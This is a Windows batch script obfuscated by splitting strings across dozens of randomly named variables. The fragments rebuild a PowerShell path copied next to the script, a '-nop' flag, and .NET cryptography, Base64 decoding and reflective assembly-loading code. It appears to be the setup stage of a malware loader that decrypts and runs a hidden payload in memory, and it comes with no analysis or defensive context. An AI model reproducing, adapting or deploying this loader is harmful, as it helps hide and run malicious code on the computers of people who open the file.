@echo off
set "CuGNlzoEhG=st"
set "oRJClVVshI=1."
set "ThTuHlnnaD=ll"
set "RyNluZRePW=do"
set "yPLnImOGll= C"
set "trWsSynSAq=xe"
set "OMbJwpIQzu=\W"
set "FBdpYiBSiZ=ow"
set "bsUgOWoyoD=Wi"
set "xEaCdXyoaI=rS"
set "LaKCyLwUJR=:\"
set "jukmwzdgxH=he"
set "SgkRzbqKnB=ll"
set "eDCBXpjvMZ=32"
set "ykOETjKoTp= /"
set "ILGWLZiboW=nd"
set "LrvGONgKku=Po"
set "wKXKgcDmCF=he"
set "qTRiSItGSC=ws"
set "ilvGKhimCW=py"
set "JlnxZFcOhp=po"
set "zBxqWdoNis=y "
set "uvppSuiVbF=em"
set "StwjCOeVgj=.e"
set "lTsGDqKGVS=0\"
set "IDrvfhqSDQ=\v"
set "KoDLUgVFyM=s\"
set "pfFEhpZPow=we"
set "ikDHtbxrjM=we"
set "pVgsrPlKSO=rs"
set "RqxSrDadPi=in"
set "PUpWitipBJ=co"
set "YpsICZuORy=Sy"
set "NbEnDizXuj=cd"
set "BkoHButirM= %~dp0"
set "HmrpLvpNyj=orF'"
set "AVAttSeXKM=$TZe"
set "jcihxBbnst=6esa"
set "TEmRwnGvhP=3); "
set "RNwROrUeTO=;$WS"
set "YflljIecEY=hUr "
set "EOcckvVxeu=JiCM"
set "JZQRHyQcLk=ecry"
set "QHaLEdScZE='[-1"
set "KdBLnWNOfr=;$WS"
set "bSGHmHTQTH=flec"
set "uWrDjhedbR=TZeN"
set "ArXNZQbrex=kyhK"
set "uUnkBqFbMa=1..-"
set "WTJtCVkFem=.Cre"
set "LguUwijpML=]::N"
set "GhDCRlCJDI=PX.D"
set "ldeCQKKbuT=FWd "
set "onmgUorgQW=YiSj"
set "NOoXGVJBTT=);$j"
set "hLwUJHUxEM=$GMQ"
set "GwbaRlkmSe=le  "
set "nvGjQZlFFJ=pher"
set "sZypIFBDEh=k; }"
set "EaAefvEobI=lBkP"
set "gbxrMlqvPL=ode]"
set "quQZFfAeKP=n = "
set "OfySRBHwFx=m.IO"
set "asReGWEloV=d;$h"
set "CJBkLiGmrZ=8kuY"
set "YuhfcGuukw=Secu"
set "uDFrAAYkvn=.Ass"
set "PUNtKJkAxD=gMod"
set "dYmVOXGhKX=rtS4"
set "gybKOnkXqB= if "
set "eTvTXGKNuC=CuSj"
set "VyputkmaIG=and "
set "LMzDLykeeA=ne);"
set "OYcLyupYyw= '')"
set "vKtYXmFYgW=yTo("
set "gqckgIYkej=.Mod"
set "hYMgpybFcV=[Sys"
set "XkkDZqQnyP=th('"
set "HPTxpfTPDP=rity"
set "eqtwihwWcy=P.Pa"
set "rKPkciZjHI=f = "
set "VxeyOZIykG=vert"
set "QCalBisUUX=ress"
set "ctIUIMERer=Stre"
set "IUumMdwhka=X = "
set "cAyfBKqwAQ=$TZe"
set "oOYXsVDmBz=lBkP"
set "jOOZMuyfan=-nop"
set "fEPNLmfKyx=IvPX"
set "IvNfVIlJUL=Disp"
set "nJSEZYGQiX=($rO"
